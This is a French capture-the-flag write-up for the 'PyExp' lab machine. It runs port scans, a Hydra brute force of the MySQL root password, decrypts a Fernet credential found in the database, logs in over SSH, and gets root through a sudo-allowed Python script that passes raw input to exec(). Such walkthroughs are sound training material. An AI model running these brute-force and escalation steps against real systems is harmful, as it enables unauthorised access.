# PyExp

    sudo nmap -p- -sV 192.168.204.118
    sudo masscan -p1-65535,U:1-65535 --rate=1000 192.168.204.118 -e tun0
    sudo /home/timothe/.local/bin/autorecon 192.168.204.118
Scans classiques.

Il n'y a que les ports 3306 (MySQL) et 1337 (SSH) qui sont ouverts. Cela laisse très peu de possibilités. J'ai tenté les credentials par défaut pour MySQL sans succès, et j'ai ensuite lancé Hydra sur l'utilisateur par défaut :

    hydra  -vV  -f  -l root -P  ~/rockyou.txt 192.168.204.118 mysql
    
On obtient un mot de passe, il n'y a plus qu'à l'utiliser pour se connecter à la base de données et la fouiller : 

    mysql  -u root -h 192.168.204.118 -P 3306
    MariaDB [(none)]> SHOW DATABASES;
    MariaDB [(none)]> USE data;
    MariaDB [(none)]> SHOW TABLES;
    MariaDB [data]> SELECT * FROM fernet;

    +--------------------------------------------------------------------------------------------------------------------------+----------------------------------------------+  
    | cred | keyy |  
    +--------------------------------------------------------------------------------------------------------------------------+----------------------------------------------+  
    | gAAAAABfMbX0bqWJTTdHKUYYG9U5Y6JGCpgEiLqmYIVlWB7t8gvsuayfhLOO_cHnJQF1_ibv14si1MbL7Dgt9Odk8mKHAXLhyHZplax0v02MMzh_z_eI7ys= | UJ5_V_b-TWKKyzlErA96f-9aEnQEfdjFbRKt8ULjdV0= |  
    +--------------------------------------------------------------------------------------------------------------------------+----------------------------------------------+  
    1 row in set (0.051 sec)

Le nom de la table est très explicite, Fernet est un module Python de chiffrement et on peut facilement utiliser des sites comme https://asecuritysite.com/tokens/ferdecode pour le déchiffrer.

On essaye les credentials obtenus sur le SSH et cela fonctionne : 

    ssh  -l lucy 192.168.204.118 -p 1337
    cat local.txt

Élévation de privilèges : 

    sudo -l		
> (root) NOPASSWD: /usr/bin/python2 /opt/exp.py

    cat /opt/exp.py
    sudo python2 /opt/exp.py
> uinput = raw_input('how are you?')  
> exec(uinput)

Ce script ne filtre pas du tout les données entrées et exécutera n'importe quelle commande, c'est une injection de commande simplissime. J'ai opté pour la ligne que j'utilise habituellement pour fiabiliser les shells pourris : 
<br /> **"import pty ; pty.spawn('/bin/bash')"**

    ls /root
    cat /root/proof.txt
